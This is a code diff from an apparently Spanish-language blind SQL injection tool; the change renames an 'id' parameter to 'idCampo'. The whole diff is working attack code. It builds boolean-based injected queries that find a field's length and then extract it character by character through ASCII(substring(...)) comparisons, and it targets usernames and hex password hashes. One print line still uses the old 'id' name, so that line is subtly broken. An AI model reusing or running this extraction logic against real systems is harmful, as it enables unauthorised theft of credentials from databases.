@@ -119,18 +119,18 @@ class StartModule():
                 break
         return result
 
-    def longitudCampoIDtablaCampo(self, id, tabla, campo, campoConocido):
+    def longitudCampoIDtablaCampo(self, idCampo, tabla, campo, campoConocido):
         for i in range(1, 100):
-            sentencia = "0 or exists(select {campo} from {tabla} where {campoConocido}={id} and length({campo}) = {i})".format(i=i+1, campo=campo, tabla=tabla, campoConocido=campoConocido, id=id)
+            sentencia = "0 or exists(select {campo} from {tabla} where {campoConocido}={id} and length({campo}) = {i})".format(i=i+1, campo=campo, tabla=tabla, campoConocido=campoConocido, id=idCampo)
             #print(sentencia)
             existe = self.ejecutarSQL(sentencia)
             if existe:
                 return i+2
         return -1
 
-    def cogerNombreDeTablaPorID(self, user, tabla, id, campoConocido):
+    def cogerNombreDeTablaPorID(self, user, tabla, idCampo, campoConocido):
         nombre = ''
-        cantidad=self.longitudCampoIDtablaCampo(id, tabla, user, campoConocido)
+        cantidad=self.longitudCampoIDtablaCampo(idCampo, tabla, user, campoConocido)
         abecedario = config['lalpha']
         if 'password' in user:
             abecedario = config_dict['hex-lower']
@@ -138,7 +138,7 @@ class StartModule():
             print('[{asterisco}] - {titulo_tabla}: {tabla} {titulo_campo}: {campo} {titulo_longitud}: {cantidad} {campoConocido}: {id} {titulo_abecedario}: {abecedario}'.format(asterisco=self.color('*', config['color_verbose']), titulo_tabla=self.color('Tabla', config['color_verbose']), tabla=tabla, titulo_campo=self.color('Campo', config['color_verbose']), campo=user, titulo_longitud=self.color('Longitud', config['color_verbose']), cantidad=cantidad-1, campoConocido=self.color(campoConocido, config['color_verbose']), id=id, titulo_abecedario=self.color('Abecedario', config['color_verbose']), abecedario=abecedario))
             for j in range(1, cantidad): # Longitud de dicho nombre de user
                 for i in range(0, len(abecedario)):
-                    existe = self.ejecutarSQL("0 or exists(select {user} from {tabla} where user_id={id} and ASCII(substring({user}, {j}, 1))={i})".format(user=user, tabla=tabla, id=id, j=j, i=ord(abecedario[i])))
+                    existe = self.ejecutarSQL("0 or exists(select {user} from {tabla} where user_id={id} and ASCII(substring({user}, {j}, 1))={i})".format(user=user, tabla=tabla, id=idCampo, j=j, i=ord(abecedario[i])))
                     if existe:
                         nombre = '{nombre}{letra}'.format(nombre=nombre, letra=abecedario[i])
                         break
